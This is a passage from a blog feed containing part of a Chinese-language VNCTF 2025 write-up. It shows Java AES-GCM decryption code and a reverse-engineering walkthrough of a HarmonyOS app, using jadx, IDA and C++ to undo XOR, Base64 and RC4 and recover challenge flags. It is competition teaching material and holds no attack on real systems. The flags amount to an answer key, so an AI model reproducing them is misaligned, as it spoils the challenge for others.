class="number">0x82</span>,<span class="number">0x02</span>,<span class="number">0x2d</span>,<span class="number">0x8c</span>,<span class="number">0xc6</span>,<span class="number">0x91</span>,<span class="number">0xd8</span>,<span class="number">0x8c</span>,<span class="number">0x68</span>,<span class="number">0xe9</span>,<span class="number">0x3e</span>,<span class="number">0xaf</span>,<span class="number">0x36</span>,<span class="number">0x5d</span>,<span class="number">0x74</span>,<span class="number">0x3f</span>,<span class="number">0x8e</span>,<span class="number">0x0c</span>,<span class="number">0x79</span>,<span class="number">0x59</span>,<span class="number">0x8a</span>,<span class="number">0xd9</span>,<span class="number">0xd8</span>,<span class="number">0xc5</span>,<span class="number">0x79</span>,<span class="number">0xdd</span>,<span class="number">0xaf</span>,<span class="number">0x71</span>,<span class="number">0x8d</span>,<span class="number">0x05</span>,<span class="number">0x5b</span>,<span class="number">0x45</span>,<span class="number">0xa5</span>,<span class="number">0x5d</span>,<span class="number">0x46</span>,<span class="number">0x25</span>,<span class="number">0xc5</span>,<span class="number">0xad</span>,<span class="number">0x29</span>,<span class="number">0xfa</span>,<span class="number">0x11</span>,<span class="number">0xc4</span>,<span class="number">0x0f</span>,<span class="number">0xcc</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">GCMParameterSpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GCMParameterSpec</span>(<span class="number">128</span>, IV.getBytes());</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">keySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(Key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] aas = <span class="keyword">new</span> <span class="title class_">byte</span>[Enc.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Enc.length; i++) &#123;</span><br><span class="line">            aas[i] = (<span class="type">byte</span>) Enc[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES_128/GCM/NoPadding&quot;</span>);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE,keySpec,spec);</span><br><span class="line">        cipher.updateAAD(AAdBytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] Original = cipher.doFinal(aas);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Original, java.nio.charset.StandardCharsets.UTF_8);</span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// VNCTF&#123;Y0U_@re_th3_Ma5t3r_0f_C0mp0s3&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{Y0U_@re_th3_Ma5t3r_0f_C0mp0s3}</strong></p><h3 id="抽奖转盘"><a href="#抽奖转盘" class="headerlink" title="抽奖转盘"></a>抽奖转盘</h3><p>jadx分析hap文件中的modules.abc文件</p><p><img src="/2025/02/12/VNCTF2025/zp1.png" alt="e2917f062e0a2de095ca14ce3b6c365e"></p><p>在MyPage下发现一段字节数组。</p><p><img src="/2025/02/12/VNCTF2025/zp2.png" alt="QQ_1739080781927"><img src="/2025/02/12/VNCTF2025/zp6.png" alt="QQ_1739080763900"></p><p>获取到一个字符串存到lexenv_0_0中，进行了一次forEach对每个字节进行了加密计算。然后再调用函数对比那个字节数组与被加密的字符串，比较是否相等，这边应该就是最后的一次加密和对比。可以将这段字节数组进行逆向计算，可以得到一串明文。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123; <span class="number">101</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">101</span>, <span class="number">76</span>, <span class="number">117</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">68</span>, <span class="number">118</span>, <span class="number">69</span>, <span class="number">55</span>, <span class="number">67</span>, <span class="number">61</span>, <span class="number">83</span>, <span class="number">62</span>, <span class="number">111</span>, <span class="number">81</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">53</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">75</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">117</span>, <span class="number">93</span>, <span class="number">127</span>, <span class="number">115</span>, <span class="number">124</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">93</span>, <span class="number">115</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EncFlag[i] ^= <span class="number">7</span>;</span><br><span class="line">EncFlag[i] -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.44s\n&quot;</span>, EncFlag);</span><br><span class="line">    <span class="comment">// aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出字符串像是Base64加密。</p><p>可以看到hap文件下有一个libhello.so。jadx全局搜索可以看到有调用libhello里面的MyCry函数，应该就是加密函数。</p><p><img src="/2025/02/12/VNCTF2025/zp3.png" alt="QQ_1739081075481"></p><p>使用IDA进行逆向分析libhello.so，通过字符串搜搜MyCry查找交叉引用找到Call。</p><p>可以看到以下流程很清晰，获取字符串，将字符串进行RC4加密（密钥为”Take_it_easy”），然后再进行Base64加密，这边判断了一个值是否等于40走不同分支。</p><p>RC4加密流程没被魔改，就最后将加密数据多异或了一个值，两个分支分别是异或上了40和24。尝试后发现40可以解密出明文。</p><p>将之前解密到的Base64字串进行decode然后RC4解密即可。</p><p><img src="/2025/02/12/VNCTF2025/zp4.png" alt="QQ_1739081335258"></p><p><img src="/2025/02/12/VNCTF2025/zp5.png" alt="QQ_1739081364253"></p><p>解密代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">s[i] = i;</span><br><span class="line">k[i] = key[i % Len_k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Data, <span class="type">unsigned</span> <span class="type">long</span> Len_D, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">rc4_init</span>(s, key, Len_k);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len_D; k++) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">Data[k] = Data[k] ^ s[t];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Cyberchef Base64 Decode(&quot;aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs&quot;)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123;<span class="number">0x68</span>,<span class="number">0xB2</span>,<span class="number">0x79</span>,<span class="number">0x68</span>,<span class="number">0x9A</span>,<span class="number">0x8E</span>,<span class="number">0xFC</span>,<span class="number">0x0A</span>,<span class="number">0x41</span>,<span class="number">0xA4</span>,<span class="number">0x0F</span>,<span class="number">0xC2</span>,<span class="number">0xF5</span>,<span class="number">0x2F</span>,<span class="number">0x20</span>,<span class="number">0x50</span>,<span class="number">0x8B</span>,<span class="number">0x1A</span>,<span class="number">0xD4</span>,<span class="number">0xC4</span>,<span class="number">0x83</span>,<span class="number">0x06</span>,<span class="number">0xD8</span>,<span class="number">0xA3</span>,<span class="number">0x28</span>,<span class="number">0x37</span>,<span class="number">0xAA</span>,<span class="number">0x63</span>,<span class="number">0x0B</span>,<span class="number">0x33</span>,<span class="number">0x89</span>,<span class="number">0x36</span>,<span class="number">0x2C</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] ^= <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;Take_it_easy&quot;</span>;</span><br><span class="line"><span class="built_in">rc4_crypt</span>(EncFlag, <span class="number">33</span>, Key, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] -= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.33s\n&quot;</span>, EncFlag);</span><br><span class="line"></span><br><span class="line"><span class="comment">// VNCTF&#123;JUst_$ne_Iast_dance_2025!&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{JUst_$ne_Iast_dance_2025!}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF-2025-WP&quot;&gt;&lt;a href=&quot;#VNCTF-2025-WP&quot; class=&quot;headerlink&quot; title=&quot;VNCTF 2025 WP&quot;&gt;&lt;/a&gt;VNCTF 2025 WP&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot;</summary>
      
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
